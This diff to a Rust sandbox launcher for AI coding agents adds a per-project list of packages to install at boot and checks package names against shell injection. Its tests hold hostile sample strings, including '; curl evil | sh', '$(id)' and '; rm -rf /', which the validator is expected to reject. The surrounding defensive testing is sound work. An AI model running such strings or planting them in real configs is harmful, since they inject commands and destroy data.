@@ -52,6 +52,67 @@ struct LocalConfig {
     /// Forward SSH keys into the sandbox for git operations.
     #[serde(default, skip_serializing_if = "std::ops::Not::not")]
     ssh: bool,
+    /// Tools this project needs inside the sandbox, reinstalled on every boot.
+    #[serde(default, skip_serializing_if = "Packages::is_empty")]
+    packages: Packages,
+}
+
+/// Tools a project declares it needs inside the sandbox, by package manager.
+///
+/// **Declared rather than accumulated.** The alternative was keeping the session's root overlay so
+/// that whatever the agent installed survived; that was rejected (`docs/history-management.md`
+/// appendix C) because the overlay dies with its agent layer, the VM stops being fresh, and
+/// nobody can say what is inside it or why. A list costs a line and survives a rebuild.
+///
+/// What it does not cover, deliberately: anything the agent installed without anyone writing it
+/// down is gone next session.
+#[derive(Serialize, Deserialize, Debug, Default, Clone, PartialEq)]
+pub(crate) struct Packages {
+    #[serde(default, skip_serializing_if = "Vec::is_empty")]
+    pub(crate) apk: Vec<String>,
+    #[serde(default, skip_serializing_if = "Vec::is_empty")]
+    pub(crate) npm: Vec<String>,
+    #[serde(default, skip_serializing_if = "Vec::is_empty")]
+    pub(crate) pip: Vec<String>,
+}
+
+impl Packages {
+    pub(crate) fn is_empty(&self) -> bool {
+        self.apk.is_empty() && self.npm.is_empty() && self.pip.is_empty()
+    }
+
+    /// Every name, tagged with the manager that would install it. Used for both the status block
+    /// and the validation pass, so neither can look at a different set than the other.
+    fn listed(&self) -> impl Iterator<Item = (&'static str, &String)> {
+        [("apk", &self.apk), ("npm", &self.npm), ("pip", &self.pip)]
+            .into_iter()
+            .flat_map(|(manager, names)| names.iter().map(move |n| (manager, n)))
+    }
+}
+
+/// Characters a package name may contain. Everything a shell would read as syntax is absent:
+/// no spaces, no `;`, `|`, `&`, `$`, backticks, quotes, newlines, and no `<` or `>` — which rules
+/// out apk's and pip's `>=` version constraints along with redirection, since no charset can tell
+/// them apart. `=` survives, so `ripgrep=14.1.0` still works.
+///
+/// **This matters because `.geli.json` is not a trusted file.** It lives in the project
+/// directory, so it can arrive inside a cloned repository, and these names go into a root shell.
+/// The damage would be confined to the VM, which is what the VM is for — but leaving an injection
+/// open because it is contained is the kind of shortcut that ages badly.
+fn valid_package_name(name: &str) -> bool {
+    !name.is_empty()
+        && name.chars().all(|c| {
+            c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.' | '+' | '@' | '/' | '=')
+        })
+}
+
+/// The declared names a shell must never see, in the order they were written.
+fn rejected_package_names(packages: &Packages) -> Vec<String> {
+    packages
+        .listed()
+        .filter(|(_, name)| !valid_package_name(name))
+        .map(|(manager, name)| format!("{}: {}", manager, name))
+        .collect()
 }
 
 fn main() -> io::Result<()> {
@@ -126,6 +187,14 @@ fn read_local_allowlist(current_dir: &Path) -> Vec<String> {
         .unwrap_or_default()
 }
 
+fn read_local_packages(current_dir: &Path) -> Packages {
+    fs::read_to_string(current_dir.join(LOCAL_CONFIG_FILE))
+        .ok()
+        .and_then(|raw| serde_json::from_str::<LocalConfig>(&raw).ok())
+        .map(|c| c.packages)
+        .unwrap_or_default()
+}
+
 fn read_local_ssh(current_dir: &Path) -> bool {
     fs::read_to_string(current_dir.join(LOCAL_CONFIG_FILE))
         .ok()
@@ -142,12 +211,14 @@ fn save_local_ssh(current_dir: &Path, workspace: &str, enabled: bool) -> io::Res
             workspace: workspace.to_string(),
             allow: Vec::new(),
             ssh: false,
+            packages: Packages::default(),
         })
     } else {
         LocalConfig {
             workspace: workspace.to_string(),
             allow: Vec::new(),
             ssh: false,
+            packages: Packages::default(),
         }
     };
 
@@ -249,6 +320,7 @@ fn get_or_create_workspace(current_dir: &Path) -> io::Result<String> {
         workspace: ws_name.clone(),
         allow: Vec::new(),
         ssh: false,
+        packages: Packages::default(),
     };
     let local_file = File::create(local_config_path)?;
     serde_json::to_writer_pretty(local_file, &config_payload).map_err(io::Error::other)?;
@@ -850,8 +922,26 @@ fn execute_sandbox(
     let host_cache_dir = home.join(".cache").join("geli-sandbox");
     let npm_cache = host_cache_dir.join("npm");
     let pip_cache = host_cache_dir.join("pip");
+    let apk_cache = host_cache_dir.join("apk");
     fs::create_dir_all(&npm_cache)?;
     fs::create_dir_all(&pip_cache)?;
+    fs::create_dir_all(&apk_cache)?;
+
+    // Read before anything is built: a name that cannot be shown to a shell should stop the run
+    // here, with the offending entry on screen, rather than after a VM has booted.
+    let packages = read_local_packages(cur);
+    let rejected = rejected_package_names(&packages);
+    if !rejected.is_empty() {
+        eprintln!(
+            "[!] {} in {} contains package names geli will not pass to a shell:\n\
+             \x20     {}\n\
+             \x20   Names may hold letters, digits and - _ . + @ / = and nothing else.",
+            LOCAL_CONFIG_FILE,
+            cur.display(),
+            rejected.join("\n      ")
+        );
+        std::process::exit(1);
+    }
 
     let vm_share_dir = staging_dir(&format!("sandbox-share-{}", pid))?;
     let sandbox_img = PathBuf::from(format!("/tmp/sandbox-session-{}.qcow2", pid));
@@ -870,7 +960,12 @@ fn execute_sandbox(
     };
     let proxy_port = proxy.as_ref().map(|(p, _)| p.port);
 
-    let plan = build_mount_script(&dirs, &cur_canon, &build_lockdown(proxy_port));
+    let plan = build_mount_script(
+        &dirs,
+        &cur_canon,
+        &build_package_setup(&packages),
+        &build_lockdown(proxy_port),
+    );
 
     let mut qemu_args: Vec<String> = Vec::new();
     let mut status_mounts: Vec<StatusMount> = Vec::new();
@@ -903,6 +998,10 @@ fn execute_sandbox(
         format!("local,path={},id=pipcache,security_model=none", pip_cache.display()),
         "-device".to_string(),
         "virtio-9p-pci,fsdev=pipcache,mount_tag=pipcache".to_string(),
+        "-fsdev".to_string(),
+        format!("local,path={},id=apkcache,security_model=none", apk_cache.display()),
+        "-device".to_string(),
+        "virtio-9p-pci,fsdev=apkcache,mount_tag=apkcache".to_string(),
     ]);
 
     // `agent` and the image chain were resolved above, before anything was overlaid.
@@ -1049,6 +1148,7 @@ fn execute_sandbox(
             &credentials.iter().map(|(p, _)| p.clone()).collect::<Vec<_>>(),
             &describe_image(&meta),
             &net,
+            &describe_packages(&packages, restrict_net),
         )
     );
 
@@ -1170,8 +1270,18 @@ mod tests {
     use yaml_rust2::YamlLoader;
 
     fn session_cloud_init(dirs: &[&str], current: &str, cmd: &str) -> String {
+        session_cloud_init_with(dirs, current, cmd, &Packages::default())
+    }
+
+    fn session_cloud_init_with(
+        dirs: &[&str],
+        current: &str,
+        cmd: &str,
+        packages: &Packages,
+    ) -> String {
         let dirs: Vec<PathBuf> = dirs.iter().map(PathBuf::from).collect();
-        let plan = build_mount_script(&dirs, Path::new(current), "");
+        let plan =
+            build_mount_script(&dirs, Path::new(current), &build_package_setup(packages), "");
         let env = build_env_exports(&[("ANTHROPIC_API_KEY", "sk-test".to_string())]);
         let seed = vec![(".claude.json".to_string(), build_claude_config(&plan.folders, "sk-ant-test-key-0123456789"))];
         build_cloud_init(&plan, cmd, &env, &[], &seed, None)
@@ -1197,6 +1307,23 @@ mod tests {
                 yaml
             );
         }
+
+        // The declared tools go into the same literal block as the mounts, and that block is
+        // where the document's shape has broken before: the install lines carry quotes, braces
+        // and `|`, and the retry helper brings its own blank lines.
+        let yaml = session_cloud_init_with(
+            &["/home/u/proj"],
+            "/home/u/proj",
+            "echo hello",
+            &Packages {
+                apk: vec!["ripgrep".into()],
+                npm: vec!["@scope/pkg".into()],
+                pip: vec!["httpx".into()],
+            },
+        );
+        let parsed = YamlLoader::load_from_str(&yaml);
+        assert!(parsed.is_ok(), "packages broke the document: {:?}\n---\n{}", parsed.err(), yaml);
+        assert!(yaml.contains("'ripgrep'"), "the install never reached the document");
     }
 
     #[test]
@@ -1213,7 +1340,7 @@ mod tests {
     #[test]
     fn restricted_session_cloud_init_parses() {
         let dirs = [PathBuf::from("/home/u/proj")];
-        let plan = build_mount_script(&dirs, Path::new("/home/u/proj"), &build_lockdown(Some(45678)));
+        let plan = build_mount_script(&dirs, Path::new("/home/u/proj"), "", &build_lockdown(Some(45678)));
         let seed = vec![(".claude.json".to_string(), build_claude_config(&plan.folders, "sk-ant-test"))];
         let creds = vec![(".claude/.credentials.json".to_string(), "{\"t\":1}".to_string())];
         let yaml = build_cloud_init(&plan, "claude", "", &creds, &seed, Some(45678));
@@ -1332,14 +1459,14 @@ mod tests {
     fn build_mount_script_marks_current_directory_as_active() {
         let tmp = std::env::temp_dir().canonicalize().unwrap();
         let dirs = vec![tmp.clone()];
-        let plan = build_mount_script(&dirs, &tmp, "");
+        let plan = build_mount_script(&dirs, &tmp, "", "");
         assert_eq!(plan.active_folder, folder_name(&tmp));
     }
 
     #[test]
     fn build_mount_script_falls_back_when_no_directory_matches() {
         // Nothing canonicalizes to this path, so the fallback in build_mount_script applies.
-        let plan = build_mount_script(&[], Path::new("/home/u/myproject"), "");
+        let plan = build_mount_script(&[], Path::new("/home/u/myproject"), "", "");
         assert_eq!(plan.active_folder, "myproject");
         assert!(!plan.script.contains("cd /workspace/\n"));
     }
@@ -1507,7 +1634,7 @@ mod tests {
     #[test]
     fn terminal_setup_survives_cloud_init() {
         let dirs = [PathBuf::from("/home/u/proj")];
-        let plan = build_mount_script(&dirs, Path::new("/home/u/proj"), "");
+        let plan = build_mount_script(&dirs, Path::new("/home/u/proj"), "", "");
         let env = format!(
             "{}\n{}",
             build_env_exports(&[("ANTHROPIC_API_KEY", "sk-test".to_string())]),
@@ -1580,7 +1707,7 @@ mod tests {
     #[test]
     fn forwarded_credentials_land_in_cloud_init() {
         let dirs = [PathBuf::from("/home/u/proj")];
-        let plan = build_mount_script(&dirs, Path::new("/home/u/proj"), "");
+        let plan = build_mount_script(&dirs, Path::new("/home/u/proj"), "", "");
         let creds = vec![(
             ".claude/.credentials.json".to_string(),
             r#"{"claudeAiOauth":{"accessToken":"tok","refreshToken":"ref"}}"#.to_string(),
@@ -1634,7 +1761,17 @@ mod tests {
         std::fs::create_dir_all(&dir).unwrap();
 
         let dirs = [PathBuf::from("/home/u/proj"), PathBuf::from("/home/u/api")];
-        let plan = build_mount_script(&dirs, Path::new("/home/u/proj"), &build_lockdown(Some(45678)));
+        let packages = Packages {
+            apk: vec!["ripgrep".into(), "jq".into()],
+            npm: vec!["@scope/pkg".into()],
+            pip: vec!["httpx".into()],
+        };
+        let plan = build_mount_script(
+            &dirs,
+            Path::new("/home/u/proj"),
+            &build_package_setup(&packages),
+            &build_lockdown(Some(45678)),
+        );
         let env = format!(
             "{}\n{}\n{}",
             build_env_exports(&[("ANTHROPIC_API_KEY", "sk-fixed".to_string())]),
@@ -1860,6 +1997,7 @@ mod tests {
         let plan = build_mount_script(
             &[PathBuf::from("/home/u/proj")],
             Path::new("/home/u/proj"),
+            "",
             &build_lockdown(Some(45678)),
         );
         let ready = plan.script.find(READY_MARKER).expect("no ready marker");
@@ -1867,6 +2005,110 @@ mod tests {
             let at = plan.script.find(step).unwrap_or_else(|| panic!("no {} in the script", step));
             assert!(at < ready, "the agent could run before `{}`", step);
         }
+    }
+
+    fn sample_packages() -> Packages {
+        Packages {
+            apk: vec!["ripgrep".into(), "jq".into()],
+            npm: vec!["prettier".into()],
+            pip: Vec::new(),
+        }
+    }
+
+    /// The order is the whole correctness of this feature. The lockdown deletes the default
+    /// route, empties `/etc/resolv.conf` and loads a default-drop ruleset, so a package fetched
+    /// after it cannot succeed — and because a failed install only warns, it would not succeed
+    /// *quietly*: the session would start without its tools and the reason would be one line in a
+    /// console log nobody reads.
+    #[test]
+    fn packages_install_before_egress_is_cut() {
+        let plan = build_mount_script(
+            &[PathBuf::from("/home/u/proj")],
+            Path::new("/home/u/proj"),
+            &build_package_setup(&sample_packages()),
+            &build_lockdown(Some(45678)),
+        );
+
+        let apk = plan.script.find("apk add").expect("no apk install");
+        let cut = plan.script.find("ip route del default").expect("no lockdown");
+        let ready = plan.script.find(READY_MARKER).expect("no ready marker");
+        assert!(apk < cut, "packages are fetched after egress was cut, so they cannot be fetched");
+        assert!(cut < ready, "the lockdown must still precede the marker");
+
+        // The caches only help if the install actually points at them: these run as root, whose
+        // own npm and pip caches are somewhere else entirely.
+        assert!(plan.script.contains("mount -t 9p"), "no 9p mounts at all");
+        assert!(plan.script.contains("apkcache /var/cache/apk"));
+        assert!(plan.script.contains("--cache /home/sandbox/.cache/npm"));
+
+        // A missing tool is not a broken promise, unlike a ruleset that failed to load — so the
+        // install block warns where the lockdown powers off. Asserted on the block alone: the
+        // lockdown's own `poweroff` lives further down the same script.
+        let block = build_package_setup(&sample_packages());
+        assert!(block.contains("install failed"), "a failed install says nothing");
+        assert!(!block.contains("poweroff"), "a failed install must not kill the session");
+    }
+
+    /// `.geli.json` can arrive inside a cloned repository, and these names reach a root shell.
+    #[test]
+    fn package_names_reject_shell_metacharacters() {
+        for bad in ["; curl evil | sh", "a b", "$(id)", "`id`", "x>y", "foo&", ""] {
+            assert!(!valid_package_name(bad), "{:?} was accepted", bad);
+        }
+        // Real names, including scoped npm packages and pinned apk versions, must survive.
+        for good in ["ripgrep", "py3-pip", "@scope/pkg", "ripgrep=14.1.0", "a_b.c+d"] {
+            assert!(valid_package_name(good), "{:?} was rejected", good);
+        }
+
+        let rejected = rejected_package_names(&Packages {
+            apk: vec!["ok".into(), "; rm -rf /".into()],
+            npm: Vec::new(),
+            pip: vec!["also bad".into()],
+        });
+        assert_eq!(rejected, vec!["apk: ; rm -rf /", "pip: also bad"]);
+    }
+
+    /// The `.geli.json` files already on disk predate this field and must keep loading, the same
+    /// guarantee `allow` and `ssh` were given.
+    #[test]
+    fn local_config_without_packages_still_parses() {
+        let old: LocalConfig = serde_json::from_str(r#"{"workspace":"w"}"#).unwrap();
+        assert!(old.packages.is_empty());
+
+        let new: LocalConfig = serde_json::from_str(
+            r#"{"workspace":"w","packages":{"apk":["ripgrep"],"npm":["prettier"]}}"#,
+        )
+        .unwrap();
+        assert_eq!(new.packages.apk, vec!["ripgrep".to_string()]);
+        assert_eq!(new.packages.npm, vec!["prettier".to_string()]);
+        assert!(new.packages.pip.is_empty());
+    }
+
+    /// Nothing declared, nothing emitted: a session that asked for no tools must generate the
+    /// same script it did before this existed.
+    #[test]
+    fn no_packages_means_no_install_step() {
+        assert_eq!(build_package_setup(&Packages::default()), "");
+    }
+
+    /// Under `--restrict-net` these fetches are the one thing a session does outside its
+    /// allowlist, and they happen before the lockdown by necessity. The status block says so
+    /// rather than letting `net restricted` imply otherwise.
+    #[test]
+    fn status_block_discloses_packages_fetched_before_the_lockdown() {
+        let open = describe_packages(&sample_packages(), false);
+        assert_eq!(open, "apk ripgrep jq · npm prettier");
+
+        let restricted = describe_packages(&sample_packages(), true);
+        assert!(restricted.contains("fetched before the egress lockdown"));
+
+        assert_eq!(describe_packages(&Packages::default(), true), "", "no tools, no line");
+
+        let out = render_status("acme", &[], "none", &[], "alpine", "restricted", &restricted);
+        assert!(out.contains("tools  apk ripgrep jq"));
+        let net = out.find("net    ").unwrap();
+        let tools = out.find("tools  ").unwrap();
+        assert!(net < tools, "the disclosure must sit under the claim it qualifies");
     }
 
     #[test]
@@ -1900,10 +2142,12 @@ mod tests {
             workspace: "w".into(),
             allow: Vec::new(),
             ssh: false,
+            packages: Packages::default(),
         })
         .unwrap();
         assert!(!written.contains("allow"));
         assert!(!written.contains("ssh"));
+        assert!(!written.contains("packages"));
 
         let ssh_cfg: LocalConfig = serde_json::from_str(r#"{"workspace":"w","ssh":true}"#).unwrap();
         assert!(ssh_cfg.ssh);
@@ -2085,7 +2329,8 @@ mod tests {
             StatusMount { host: "/home/u/api".into(), guest: "/workspace/api".into(), active: false },
         ];
         let copied = vec![".claude/.credentials.json".to_string()];
-        let out = render_status("acme", &mounts, "claude.ai credentials", &copied, "alpine 3.22", "open");
+        let out =
+            render_status("acme", &mounts, "claude.ai credentials", &copied, "alpine 3.22", "open", "");
 
         assert!(out.starts_with("geli · workspace acme\n"));
         assert!(out.contains("/home/u/proj → /workspace/proj  (active)"));
@@ -2102,7 +2347,7 @@ mod tests {
     /// somewhere other than the terminal, and signal readiness through it.
     #[test]
     fn mount_script_ends_with_the_ready_marker() {
-        let plan = build_mount_script(&[PathBuf::from("/home/u/proj")], Path::new("/home/u/proj"), "");
+        let plan = build_mount_script(&[PathBuf::from("/home/u/proj")], Path::new("/home/u/proj"), "", "");
         assert_eq!(
             plan.script.trim_end().lines().last().unwrap().trim(),
             format!("echo {}", READY_MARKER)
